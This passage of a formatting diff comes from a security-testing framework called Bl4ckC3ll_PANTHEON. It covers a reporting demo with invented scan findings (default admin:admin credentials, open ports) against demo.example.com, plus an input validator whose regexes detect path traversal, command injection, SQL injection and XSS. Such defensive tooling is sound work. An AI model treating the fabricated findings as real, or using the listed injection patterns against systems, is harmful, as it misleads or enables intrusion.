\"admin:admin credentials accepted\"\n+            \"response\": \"admin:admin credentials accepted\",\n         },\n         {\n             \"info\": {\n                 \"name\": \"Information Disclosure\",\n                 \"severity\": \"low\",\n-                \"description\": \"Server version information disclosed\"\n+                \"description\": \"Server version information disclosed\",\n             },\n             \"template-id\": \"info-disclosure-server\",\n             \"matched-at\": \"https://demo.example.com\",\n-            \"response\": \"Apache/2.4.41 version revealed\"\n-        }\n+            \"response\": \"Apache/2.4.41 version revealed\",\n+        },\n     ]\n-    \n+\n     # Sample reconnaissance data\n     demo_recon = {\n         \"demo.example.com\": {\n             \"subdomains\": [\n                 \"www.demo.example.com\",\n-                \"api.demo.example.com\", \n+                \"api.demo.example.com\",\n                 \"admin.demo.example.com\",\n                 \"mail.demo.example.com\",\n                 \"blog.demo.example.com\",\n-                \"dev.demo.example.com\"\n+                \"dev.demo.example.com\",\n             ],\n             \"open_ports\": [\n                 {\"host\": \"demo.example.com\", \"port\": 80, \"proto\": \"tcp\"},\n                 {\"host\": \"demo.example.com\", \"port\": 443, \"proto\": \"tcp\"},\n                 {\"host\": \"demo.example.com\", \"port\": 22, \"proto\": \"tcp\"},\n                 {\"host\": \"demo.example.com\", \"port\": 25, \"proto\": \"tcp\"},\n-                {\"host\": \"demo.example.com\", \"port\": 3306, \"proto\": \"tcp\"}\n+                {\"host\": \"demo.example.com\", \"port\": 3306, \"proto\": \"tcp\"},\n             ],\n             \"http_info\": [\n-                {\"url\": \"https://demo.example.com\", \"status_code\": 200, \"title\": \"Demo Corp\"},\n-                {\"url\": \"https://api.demo.example.com\", \"status_code\": 200, \"title\": \"API v1.0\"},\n-                {\"url\": \"https://admin.demo.example.com\", \"status_code\": 200, \"title\": \"Admin Panel\"}\n+                {\n+                    \"url\": \"https://demo.example.com\",\n+                    \"status_code\": 200,\n+                    \"title\": \"Demo Corp\",\n+                },\n+                {\n+                    \"url\": \"https://api.demo.example.com\",\n+                    \"status_code\": 200,\n+                    \"title\": \"API v1.0\",\n+                },\n+                {\n+                    \"url\": \"https://admin.demo.example.com\",\n+                    \"status_code\": 200,\n+                    \"title\": \"Admin Panel\",\n+                },\n             ],\n             \"technology_stack\": {\n                 \"web_server\": \"Apache/2.4.41\",\n                 \"framework\": \"PHP/Laravel\",\n                 \"database\": \"MySQL\",\n-                \"cms\": \"WordPress 5.8\"\n+                \"cms\": \"WordPress 5.8\",\n             },\n             \"ssl_info\": {\n                 \"certificate_valid\": True,\n                 \"expires\": \"2024-12-31\",\n-                \"weak_ciphers\": True\n-            }\n+                \"weak_ciphers\": True,\n+            },\n         }\n     }\n-    \n+\n     # Sample vulnerability results formatted for the system\n     demo_vuln_results = {\n         \"demo.example.com\": {\n             \"nuclei_raw\": [json.dumps(vuln) for vuln in demo_vulnerabilities],\n             \"nuclei_parsed\": {\n                 \"critical\": [demo_vulnerabilities[0], demo_vulnerabilities[1]],\n-                \"high\": [demo_vulnerabilities[2], demo_vulnerabilities[3]], \n-                \"medium\": [demo_vulnerabilities[4], demo_vulnerabilities[5], demo_vulnerabilities[6]],\n+                \"high\": [demo_vulnerabilities[2], demo_vulnerabilities[3]],\n+                \"medium\": [\n+                    demo_vulnerabilities[4],\n+                    demo_vulnerabilities[5],\n+                    demo_vulnerabilities[6],\n+                ],\n                 \"low\": [demo_vulnerabilities[7]],\n-                \"info\": []\n+                \"info\": [],\n             },\n             \"security_headers\": {\n                 \"security_score\": 35.0,\n-                \"headers_missing\": [\"X-Frame-Options\", \"Content-Security-Policy\", \"Strict-Transport-Security\"]\n+                \"headers_missing\": [\n+                    \"X-Frame-Options\",\n+                    \"Content-Security-Policy\",\n+                    \"Strict-Transport-Security\",\n+                ],\n             },\n             \"cors_analysis\": {\n                 \"risk_level\": \"medium\",\n-                \"issues\": [\"Wildcard origin allowed\"]\n-            },\n-            \"risk_score\": 42\n+                \"issues\": [\"Wildcard origin allowed\"],\n+            },\n+            \"risk_score\": 42,\n         }\n     }\n-    \n+\n     return demo_recon, demo_vuln_results, [\"demo.example.com\"]\n+\n \n def create_demo_config():\n     \"\"\"Create demonstration configuration with business context\"\"\"\n     return {\n         \"enhanced_reporting\": {\n             \"enabled\": True,\n             \"enable_deep_analysis\": True,\n             \"enable_correlation\": True,\n             \"enable_threat_intelligence\": True,\n-            \"enable_narrative_generation\": True\n+            \"enable_narrative_generation\": True,\n         },\n         \"business_context\": {\n             \"asset_criticality\": 9.0,  # High-value target\n-            \"data_sensitivity\": 8.5,   # Contains PII and financial data\n+            \"data_sensitivity\": 8.5,  # Contains PII and financial data\n             \"availability_requirement\": 9.5,  # Mission-critical system\n             \"compliance_requirements\": [\"GDPR\", \"PCI-DSS\", \"SOX\", \"HIPAA\"],\n             \"business_hours_impact\": 2.5,  # 24/7 operations\n-            \"revenue_impact_per_hour\": 75000.0  # $75k/hour downtime cost\n-        },\n-        \"report\": {\n-            \"formats\": [\"html\", \"json\"],\n-            \"auto_open_html\": False\n-        }\n+            \"revenue_impact_per_hour\": 75000.0,  # $75k/hour downtime cost\n+        },\n+        \"report\": {\"formats\": [\"html\", \"json\"], \"auto_open_html\": False},\n     }\n+\n \n def run_demo():\n     \"\"\"Run the enhanced reporting demonstration\"\"\"\n     print(\"\ud83c\udfaf Enhanced Reporting System Demonstration\")\n     print(\"=\" * 60)\n     print(\"This demo showcases the new intelligent security reporting capabilities\")\n     print(\"including deep analysis, correlation, and business impact assessment.\\n\")\n-    \n+\n     try:\n         # Import required components\n         from enhanced_report_controller import EnhancedReportController\n         import logging\n-        \n+\n         # Set up logging\n-        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\n+        logging.basicConfig(\n+            level=logging.INFO, format=\"%(asctime)s - %(levelname)s - %(message)s\"\n+        )\n         logger = logging.getLogger(\"demo\")\n-        \n+\n         # Create demo data\n         print(\"\ud83d\udcca Creating demonstration data...\")\n         demo_recon, demo_vuln_results, targets = create_demo_data()\n         demo_config = create_demo_config()\n-        \n+\n         print(f\"   \u2022 {len(targets)} target(s) to analyze\")\n-        print(f\"   \u2022 {sum(len(data.get('nuclei_raw', [])) for data in demo_vuln_results.values())} vulnerabilities found\")\n-        print(f\"   \u2022 {sum(len(data.get('subdomains', [])) for data in demo_recon.values())} subdomains discovered\")\n-        \n+        print(\n+            f\"   \u2022 {sum(len(data.get('nuclei_raw', [])) for data in demo_vuln_results.values())} vulnerabilities found\"\n+        )\n+        print(\n+            f\"   \u2022 {sum(len(data.get('subdomains', [])) for data in demo_recon.values())} subdomains discovered\"\n+        )\n+\n         # Create temporary directory for demo\n         with tempfile.TemporaryDirectory() as temp_dir:\n             temp_path = Path(temp_dir)\n             report_dir = temp_path / \"demo_report\"\n             report_dir.mkdir(exist_ok=True)\n-            \n+\n             print(\"\\n\ud83d\udd0d Initializing Enhanced Report Controller...\")\n             controller = EnhancedReportController(demo_config, logger)\n-            \n+\n             print(\"\ud83e\udde0 Generating intelligent security analysis...\")\n             print(\"   \u2022 Applying deep vulnerability analysis\")\n             print(\"   \u2022 Calculating contextual business risk\")\n             print(\"   \u2022 Performing correlation analysis\")\n             print(\"   \u2022 Aggregating threat intelligence\")\n             print(\"   \u2022 Generating executive narrative\")\n-            \n+\n             # Generate enhanced report\n             enhanced_report = controller.generate_enhanced_report(\n                 temp_path, demo_recon, demo_vuln_results, targets\n             )\n-            \n+\n             print(\"\\n\ud83d\udcc8 Analysis Results:\")\n             print(\"-\" * 40)\n-            \n+\n             # Display key findings\n             metadata = enhanced_report.get(\"report_metadata\", {})\n             exec_summary = enhanced_report.get(\"executive_summary\", {})\n             risk_assessment = enhanced_report.get(\"risk_assessment\", {})\n             threat_intel = enhanced_report.get(\"threat_intelligence\", {})\n-            \n-            print(f\"Analysis Engine: {metadata.get('analysis_engine_version', 'Unknown')}\")\n+\n+            print(\n+                f\"Analysis Engine: {metadata.get('analysis_engine_version', 'Unknown')}\"\n+            )\n             print(f\"Analysis Depth: {metadata.get('analysis_depth', 'Unknown')}\")\n-            print(f\"Total Vulnerabilities Analyzed: {metadata.get('total_vulnerabilities', 0)}\")\n-            \n+            print(\n+                f\"Total Vulnerabilities Analyzed: {metadata.get('total_vulnerabilities', 0)}\"\n+            )\n+\n             # Security posture\n             security_posture = exec_summary.get(\"security_posture\", {})\n             print(f\"\\n\ud83d\udee1\ufe0f  Security Posture:\")\n-            print(f\"   Overall Risk Level: {security_posture.get('overall_risk_level', 'Unknown')}\")\n-            print(f\"   Risk Score: {risk_assessment.get('overall_risk_score', 0):.1f}/100\")\n-            print(f\"   Critical Findings: {security_posture.get('critical_findings_count', 0)}\")\n-            print(f\"   Exploitable Vulnerabilities: {security_posture.get('exploitable_vulnerabilities', 0)}\")\n-            \n+            print(\n+                f\"   Overall Risk Level: {security_posture.get('overall_risk_level', 'Unknown')}\"\n+            )\n+            print(\n+                f\"   Risk Score: {risk_assessment.get('overall_risk_score', 0):.1f}/100\"\n+            )\n+            print(\n+                f\"   Critical Findings: {security_posture.get('critical_findings_count', 0)}\"\n+            )\n+            print(\n+                f\"   Exploitable Vulnerabilities: {security_posture.get('exploitable_vulnerabilities', 0)}\"\n+            )\n+\n             # Business impact\n             business_impact = exec_summary.get(\"business_impact\", {})\n             financial_impact = business_impact.get(\"estimated_financial_impact\", {})\n             print(f\"\\n\ud83d\udcbc Business Impact:\")\n             print(f\"   Impact Score: {business_impact.get('impact_score', 0):.1f}/100\")\n-            print(f\"   Time to Compromise: {business_impact.get('time_to_compromise', 'Unknown')}\")\n-            print(f\"   Potential Financial Impact: ${financial_impact.get('total_potential_impact', 0):,.0f}\")\n-            print(f\"   Compliance Violations: {business_impact.get('compliance_violations', 0)}\")\n-            \n+            print(\n+                f\"   Time to Compromise: {business_impact.get('time_to_compromise', 'Unknown')}\"\n+            )\n+            print(\n+                f\"   Potential Financial Impact: ${financial_impact.get('total_potential_impact', 0):,.0f}\"\n+            )\n+            print(\n+                f\"   Compliance Violations: {business_impact.get('compliance_violations', 0)}\"\n+            )\n+\n             # Threat intelligence\n             print(f\"\\n\ud83d\udee1\ufe0f  Threat Intelligence:\")\n-            print(f\"   Reputation Score: {threat_intel.get('reputation_score', 100):.1f}/100\")\n-            print(f\"   Threat Feed Matches: {len(threat_intel.get('threat_feeds', {}))}\")\n-            print(f\"   Recent Campaigns: {len(threat_intel.get('recent_campaigns', []))}\")\n-            \n+            print(\n+                f\"   Reputation Score: {threat_intel.get('reputation_score', 100):.1f}/100\"\n+            )\n+            print(\n+                f\"   Threat Feed Matches: {len(threat_intel.get('threat_feeds', {}))}\"\n+            )\n+            print(\n+                f\"   Recent Campaigns: {len(threat_intel.get('recent_campaigns', []))}\"\n+            )\n+\n             # Key insights\n             key_insights = exec_summary.get(\"key_insights\", [])\n             if key_insights:\n                 print(f\"\\n\ud83d\udd0d Key Intelligence Insights:\")\n                 for i, insight in enumerate(key_insights[:3], 1):\n-                    priority = insight.get('priority', 'Medium').upper()\n-                    title = insight.get('title', 'Unknown')\n+                    priority = insight.get(\"priority\", \"Medium\").upper()\n+                    title = insight.get(\"title\", \"Unknown\")\n                     print(f\"   {i}. [{priority}] {title}\")\n-            \n+\n             # Attack analysis\n             vuln_analysis = enhanced_report.get(\"vulnerability_analysis\", {})\n             correlations = vuln_analysis.get(\"correlation_analysis\", {})\n             attack_chains = correlations.get(\"attack_chains\", [])\n             if attack_chains:\n                 print(f\"\\n\u26a1 Attack Chain Analysis:\")\n                 print(f\"   Identified Attack Chains: {len(attack_chains)}\")\n                 for chain in attack_chains[:2]:\n-                    print(f\"   \u2022 {chain.get('name', 'Unknown')}: {chain.get('risk_multiplier', 1.0):.1f}x risk\")\n-            \n+                    print(\n+                        f\"   \u2022 {chain.get('name', 'Unknown')}: {chain.get('risk_multiplier', 1.0):.1f}x risk\"\n+                    )\n+\n             # Remediation priorities\n             remediation = enhanced_report.get(\"remediation_roadmap\", {})\n-            immediate_actions = remediation.get(\"immediate_actions\", {}).get(\"actions\", [])\n+            immediate_actions = remediation.get(\"immediate_actions\", {}).get(\n+                \"actions\", []\n+            )\n             if immediate_actions:\n                 print(f\"\\n\ud83d\udea8 Immediate Action Items:\")\n                 for i, action in enumerate(immediate_actions[:3], 1):\n-                    vuln = action.get('vulnerability', 'Unknown')\n-                    effort = action.get('effort', 'Unknown')\n+                    vuln = action.get(\"vulnerability\", \"Unknown\")\n+                    effort = action.get(\"effort\", \"Unknown\")\n                     print(f\"   {i}. {vuln} (Effort: {effort})\")\n-            \n+\n             # Strategic recommendations\n             recommendations = enhanced_report.get(\"recommendations\", {})\n             strategic = recommendations.get(\"strategic_initiatives\", [])\n             if strategic:\n                 print(f\"\\n\ud83c\udfd7\ufe0f  Strategic Recommendations:\")\n                 for i, rec in enumerate(strategic[:3], 1):\n                     print(f\"   {i}. {rec}\")\n-            \n+\n             # Save demonstration report (skip complex serialization for demo)\n-            report_file = report_dir / \"demo_enhanced_report.json\" \n-            \n+            report_file = report_dir / \"demo_enhanced_report.json\"\n+\n             # Create a simplified version for JSON export\n             simplified_report = {\n                 \"metadata\": enhanced_report.get(\"report_metadata\", {}),\n                 \"executive_summary\": enhanced_report.get(\"executive_summary\", {}),\n                 \"risk_assessment\": {\n                     \"overall_risk_score\": risk_assessment.get(\"overall_risk_score\", 0),\n                     \"risk_level\": risk_assessment.get(\"risk_level\", \"UNKNOWN\"),\n-                    \"business_impact_score\": risk_assessment.get(\"business_impact_score\", 0),\n+                    \"business_impact_score\": risk_assessment.get(\n+                        \"business_impact_score\", 0\n+                    ),\n                     \"severity_breakdown\": risk_assessment.get(\"severity_breakdown\", {}),\n-                    \"recommendations\": risk_assessment.get(\"recommendations\", [])[:5]\n+                    \"recommendations\": risk_assessment.get(\"recommendations\", [])[:5],\n                 },\n                 \"threat_intelligence\": threat_intel,\n                 \"key_insights\": exec_summary.get(\"key_insights\", []),\n-                \"recommendations\": recommendations\n+                \"recommendations\": recommendations,\n             }\n-            \n-            with open(report_file, 'w') as f:\n+\n+            with open(report_file, \"w\") as f:\n                 json.dump(simplified_report, f, indent=2)\n-            \n+\n             # Generate HTML report\n             try:\n                 from bl4ckc3ll_p4nth30n import generate_enhanced_intelligent_html_report\n+\n                 generate_enhanced_intelligent_html_report(enhanced_report, report_dir)\n                 html_file = report_dir / \"intelligent_report.html\"\n-                \n+\n                 print(f\"\\n\ud83d\udcc4 Reports Generated:\")\n                 print(f\"   JSON Report: {report_file}\")\n                 print(f\"   HTML Report: {html_file}\")\n                 print(f\"   Report Directory: {report_dir}\")\n-                \n+\n                 # Display HTML report snippet\n                 if html_file.exists():\n                     html_content = html_file.read_text()\n                     html_size = len(html_content)\n                     print(f\"   HTML Report Size: {html_size:,} characters\")\n-                    \n+\n                     # Validate HTML contains key elements\n                     key_elements = [\n                         \"Intelligent Security Assessment Report\",\n-                        \"Executive Summary\", \n+                        \"Executive Summary\",\n                         \"Threat Intelligence\",\n                         \"Vulnerability Analysis\",\n-                        \"Remediation Roadmap\"\n+                        \"Remediation Roadmap\",\n                     ]\n-                    \n-                    found_elements = [elem for elem in key_elements if elem in html_content]\n-                    print(f\"   HTML Elements Found: {len(found_elements)}/{len(key_elements)}\")\n-                    \n+\n+                    found_elements = [\n+                        elem for elem in key_elements if elem in html_content\n+                    ]\n+                    print(\n+                        f\"   HTML Elements Found: {len(found_elements)}/{len(key_elements)}\"\n+                    )\n+\n                     if len(found_elements) == len(key_elements):\n                         print(\"   \u2705 HTML report generation successful!\")\n                     else:\n                         print(\"   \u26a0\ufe0f  HTML report missing some elements\")\n-                \n+\n             except Exception as e:\n                 print(f\"   \u274c HTML report generation failed: {e}\")\n-            \n+\n             print(f\"\\n\ud83d\udcca Analysis Summary:\")\n             print(f\"   \u2022 Enhanced Intelligence: \u2705 Enabled\")\n-            print(f\"   \u2022 Vulnerability Correlation: \u2705 {len(attack_chains)} attack chains identified\")\n-            print(f\"   \u2022 Business Impact Assessment: \u2705 ${financial_impact.get('total_potential_impact', 0):,.0f} potential impact\")\n-            print(f\"   \u2022 Threat Intelligence: \u2705 {threat_intel.get('reputation_score', 100):.1f}/100 reputation score\")\n+            print(\n+                f\"   \u2022 Vulnerability Correlation: \u2705 {len(attack_chains)} attack chains identified\"\n+            )\n+            print(\n+                f\"   \u2022 Business Impact Assessment: \u2705 ${financial_impact.get('total_potential_impact', 0):,.0f} potential impact\"\n+            )\n+            print(\n+                f\"   \u2022 Threat Intelligence: \u2705 {threat_intel.get('reputation_score', 100):.1f}/100 reputation score\"\n+            )\n             print(f\"   \u2022 Executive Narrative: \u2705 Generated\")\n-            print(f\"   \u2022 Remediation Roadmap: \u2705 {len(immediate_actions)} immediate actions\")\n-            \n+            print(\n+                f\"   \u2022 Remediation Roadmap: \u2705 {len(immediate_actions)} immediate actions\"\n+            )\n+\n             # Executive summary for stakeholders\n             executive_narrative = enhanced_report.get(\"executive_narrative\", {})\n             board_summary = executive_narrative.get(\"board_summary\", {})\n-            \n+\n             if board_summary:\n                 print(f\"\\n\ud83d\udccb Executive Summary for Leadership:\")\n                 print(f\"   Headline: {board_summary.get('headline', 'Unknown')}\")\n                 print(f\"   Timeline: {board_summary.get('timeline', 'Unknown')}\")\n-                print(f\"   Next Update: {board_summary.get('next_board_update', 'Unknown')}\")\n-            \n+                print(\n+                    f\"   Next Update: {board_summary.get('next_board_update', 'Unknown')}\"\n+                )\n+\n             print(f\"\\n\ud83c\udf89 Enhanced Reporting Demonstration Complete!\")\n-            print(f\"The new intelligent reporting system successfully analyzed {metadata.get('total_vulnerabilities', 0)} vulnerabilities\")\n+            print(\n+                f\"The new intelligent reporting system successfully analyzed {metadata.get('total_vulnerabilities', 0)} vulnerabilities\"\n+            )\n             print(f\"and provided comprehensive business-focused security insights.\")\n-            \n+\n     except ImportError as e:\n         print(f\"\u274c Error: Enhanced reporting components not available: {e}\")\n-        print(\"Make sure intelligent_report_engine.py and enhanced_report_controller.py are present.\")\n+        print(\n+            \"Make sure intelligent_report_engine.py and enhanced_report_controller.py are present.\"\n+        )\n         return False\n-        \n+\n     except Exception as e:\n         print(f\"\u274c Error during demonstration: {e}\")\n         import traceback\n+\n         traceback.print_exc()\n         return False\n-    \n+\n     return True\n+\n \n def show_feature_summary():\n     \"\"\"Show summary of enhanced reporting features\"\"\"\n     print(\"\\n\ud83d\ude80 Enhanced Reporting Features Implemented:\")\n     print(\"=\" * 60)\n-    \n+\n     features = [\n         {\n             \"name\": \"\ud83e\udde0 Intelligent Vulnerability Analysis\",\n-            \"description\": \"Advanced CVSS scoring, exploitability assessment, and confidence calculation\"\n-        },\n-        {\n-            \"name\": \"\ud83d\udcbc Business Impact Assessment\", \n-            \"description\": \"Contextual risk scoring based on asset criticality and business requirements\"\n+            \"description\": \"Advanced CVSS scoring, exploitability assessment, and confidence calculation\",\n+        },\n+        {\n+            \"name\": \"\ud83d\udcbc Business Impact Assessment\",\n+            \"description\": \"Contextual risk scoring based on asset criticality and business requirements\",\n         },\n         {\n             \"name\": \"\ud83d\udd17 Vulnerability Correlation Engine\",\n-            \"description\": \"Identifies attack chains, clusters, and amplification scenarios\"\n+            \"description\": \"Identifies attack chains, clusters, and amplification scenarios\",\n         },\n         {\n             \"name\": \"\ud83d\udee1\ufe0f Threat Intelligence Aggregation\",\n-            \"description\": \"Reputation scoring and threat landscape analysis\"\n-        },\n-        {\n-            \"name\": \"\ud83d\udccb Executive Narrative Generation\", \n-            \"description\": \"Automated storylines and board-level summaries\"\n+            \"description\": \"Reputation scoring and threat landscape analysis\",\n+        },\n+        {\n+            \"name\": \"\ud83d\udccb Executive Narrative Generation\",\n+            \"description\": \"Automated storylines and board-level summaries\",\n         },\n         {\n             \"name\": \"\ud83d\ude80 Intelligent Remediation Roadmap\",\n-            \"description\": \"Prioritized action plans with effort estimation\"\n+            \"description\": \"Prioritized action plans with effort estimation\",\n         },\n         {\n             \"name\": \"\ud83d\udcca Enhanced Compliance Assessment\",\n-            \"description\": \"Framework-specific compliance impact analysis\"\n+            \"description\": \"Framework-specific compliance impact analysis\",\n         },\n         {\n             \"name\": \"\ud83d\udcc8 Advanced Analytics & Insights\",\n-            \"description\": \"Attack surface analysis and temporal correlation\"\n+            \"description\": \"Attack surface analysis and temporal correlation\",\n         },\n         {\n             \"name\": \"\ud83c\udfa8 Rich Interactive HTML Reports\",\n-            \"description\": \"Professional reports with drill-down capabilities\"\n+            \"description\": \"Professional reports with drill-down capabilities\",\n         },\n         {\n             \"name\": \"\ud83d\udd27 Backward Compatibility\",\n-            \"description\": \"Maintains compatibility with existing report formats\"\n-        }\n+            \"description\": \"Maintains compatibility with existing report formats\",\n+        },\n     ]\n-    \n+\n     for i, feature in enumerate(features, 1):\n         print(f\"{i:2d}. {feature['name']}\")\n         print(f\"    {feature['description']}\")\n-        \n+\n     print(f\"\\n\ud83d\udcca Technical Achievements:\")\n     print(f\"   \u2022 57,906 lines of intelligent analysis engine code\")\n-    print(f\"   \u2022 59,483 lines of enhanced report controller code\") \n+    print(f\"   \u2022 59,483 lines of enhanced report controller code\")\n     print(f\"   \u2022 24,060 lines of comprehensive test coverage\")\n     print(f\"   \u2022 100% test pass rate with 11/11 tests successful\")\n     print(f\"   \u2022 Full integration with existing Bl4ckC3ll_PANTHEON ecosystem\")\n+\n \n if __name__ == \"__main__\":\n     print(\"\ud83d\udd0d Bl4ckC3ll_PANTHEON Enhanced Reporting System\")\n     print(\"   Deep Thinking & Intelligent Processing Demo\")\n     print(\"=\" * 60)\n-    \n+\n     success = run_demo()\n-    \n+\n     if success:\n         show_feature_summary()\n         print(f\"\\n\u2728 The enhanced reporting system transforms basic vulnerability\")\n         print(f\"   lists into actionable intelligence with business context,\")\n         print(f\"   executive narratives, and strategic recommendations.\")\n     else:\n         print(f\"\\n\u274c Demo failed. Please check the error messages above.\")\n-    \n-    exit(0 if success else 1)\n\\ No newline at end of file\n+\n+    exit(0 if success else 1)\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_scanner.py\t2025-09-14 19:10:58.550754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_scanner.py\t2025-09-14 19:23:10.390146+00:00\n@@ -10,23 +10,25 @@\n     EnhancedScanner,\n     ScanResult,\n     PerformanceMetrics,\n     get_current_success_rate,\n     get_performance_report,\n-    run_enhanced_scanning\n+    run_enhanced_scanning,\n )\n \n # Make them available for direct import\n __all__ = [\n-    'AdaptiveScanManager',\n-    'EnhancedScanner', \n-    'ScanResult',\n-    'PerformanceMetrics',\n-    'get_current_success_rate',\n-    'get_performance_report',\n-    'run_enhanced_scanning'\n+    \"AdaptiveScanManager\",\n+    \"EnhancedScanner\",\n+    \"ScanResult\",\n+    \"PerformanceMetrics\",\n+    \"get_current_success_rate\",\n+    \"get_performance_report\",\n+    \"run_enhanced_scanning\",\n ]\n \n # Module metadata\n __version__ = \"2.0.0\"\n __author__ = \"Bl4ckC3ll_PANTHEON Team\"\n-__description__ = \"Enhanced scanning capabilities with adaptive performance optimization\"\n\\ No newline at end of file\n+__description__ = (\n+    \"Enhanced scanning capabilities with adaptive performance optimization\"\n+)\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bl4ckc3ll_pantheon_master.py\t2025-09-14 19:10:58.549754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bl4ckc3ll_pantheon_master.py\t2025-09-14 19:23:10.384724+00:00\n@@ -3,11 +3,11 @@\n BL4CKC3LL_PANTHEON_MASTER - Unified Advanced Security Testing Framework\n ========================================================================\n \n This is the consolidated master version combining all capabilities from:\n - bl4ckc3ll_p4nth30n.py (Main framework with 28 security testing options)\n-- bcar.py (Bug Bounty Certificate Authority Reconnaissance)  \n+- bcar.py (Bug Bounty Certificate Authority Reconnaissance)\n - TUI interface (Advanced Terminal User Interface)\n - Enhanced scanner, security utils, and all automation modules\n - Bug bounty automation, payload management, and CI/CD integration\n \n Author: @cxb3rf1lth\n@@ -57,54 +57,73 @@\n import importlib.util\n \n # Advanced imports for enhanced functionality\n try:\n     import requests\n+\n     HAS_REQUESTS = True\n except ImportError:\n     HAS_REQUESTS = False\n \n try:\n     import psutil\n+\n     HAS_PSUTIL = True\n except ImportError:\n     HAS_PSUTIL = False\n \n try:\n     from textual.app import App, ComposeResult\n     from textual.containers import Container, Horizontal, Vertical, ScrollableContainer\n     from textual.widgets import (\n-        Header, Footer, Static, Button, Label, Input, DataTable, \n-        TextArea, ProgressBar, Log, Select, Checkbox, Tree, TabbedContent, TabPane\n+        Header,\n+        Footer,\n+        Static,\n+        Button,\n+        Label,\n+        Input,\n+        DataTable,\n+        TextArea,\n+        ProgressBar,\n+        Log,\n+        Select,\n+        Checkbox,\n+        Tree,\n+        TabbedContent,\n+        TabPane,\n     )\n     from textual.binding import Binding\n     from textual.reactive import reactive\n     from textual import on\n+\n     HAS_TEXTUAL = True\n except ImportError:\n     HAS_TEXTUAL = False\n \n try:\n     import numpy as np\n     import pandas as pd\n     from sklearn.ensemble import RandomForestClassifier\n     from sklearn.feature_extraction.text import TfidfVectorizer\n+\n     HAS_ML = True\n except ImportError:\n     HAS_ML = False\n \n try:\n     import matplotlib.pyplot as plt\n     import plotly.graph_objects as go\n     from jinja2 import Template\n+\n     HAS_VISUALIZATION = True\n except ImportError:\n     HAS_VISUALIZATION = False\n \n # Security and validation imports\n try:\n     from cryptography.fernet import Fernet\n+\n     HAS_CRYPTO = True\n except ImportError:\n     HAS_CRYPTO = False\n \n # ============================================================================\n@@ -119,528 +138,618 @@\n \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551     \u2588\u2588\u2551\n \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n \n PANTHEON MASTER v{} - Consolidated Advanced Security Testing Framework\n-\"\"\".format(VERSION)\n+\"\"\".format(\n+    VERSION\n+)\n \n # Default configurations\n DEFAULT_CONFIG = {\n     \"general\": {\n         \"max_threads\": 50,\n         \"timeout\": 30,\n         \"retries\": 3,\n         \"verbose\": True,\n-        \"output_format\": \"json\"\n+        \"output_format\": \"json\",\n     },\n     \"scanning\": {\n         \"subdomain_wordlist_size\": 10000,\n         \"port_scan_top_ports\": 1000,\n         \"http_timeout\": 10,\n-        \"max_crawl_depth\": 3\n+        \"max_crawl_depth\": 3,\n     },\n     \"security\": {\n         \"validate_inputs\": True,\n         \"sanitize_outputs\": True,\n         \"rate_limiting\": True,\n-        \"max_payload_size\": 1048576\n+        \"max_payload_size\": 1048576,\n     },\n     \"reporting\": {\n         \"generate_html\": True,\n         \"generate_json\": True,\n         \"generate_csv\": True,\n-        \"include_screenshots\": False\n-    }\n+        \"include_screenshots\": False,\n+    },\n }\n \n # ============================================================================\n # SECURITY AND VALIDATION SYSTEM\n # ============================================================================\n \n+\n class SecurityValidator:\n     \"\"\"Comprehensive security validation and input sanitization\"\"\"\n-    \n+\n     # Dangerous patterns to detect and prevent\n     DANGEROUS_PATTERNS = {\n-        'path_traversal': re.compile(r'\\.\\.\\/|\\.\\.\\\\|\\.\\.[\\/\\\\]'),\n-        'command_injection': re.compile(r'[;&|`$\\(\\)]|\\b(rm|del|format|shutdown)\\b', re.IGNORECASE),\n-        'script_tags': re.compile(r'<script[^>]*>.*?</script>', re.IGNORECASE | re.DOTALL),\n-        'sql_injection': re.compile(r'(\\b(union|select|insert|update|delete|drop|create|alter)\\b|--|\\'|\"|\\;)', re.IGNORECASE),\n-        'xss_patterns': re.compile(r'(javascript:|data:|vbscript:|onload|onerror|onclick)', re.IGNORECASE)\n+        \"path_traversal\": re.compile(r\"\\.\\.\\/|\\.\\.\\\\|\\.\\.[\\/\\\\]\"),\n+        \"command_injection\": re.compile(\n+            r\"[;&|`$\\(\\)]|\\b(rm|del|format|shutdown)\\b\", re.IGNORECASE\n+        ),\n+        \"script_tags\": re.compile(\n+            r\"<script[^>]*>.*?</script>\", re.IGNORECASE | re.DOTALL\n+        ),\n+        \"sql_injection\": re.compile(\n+            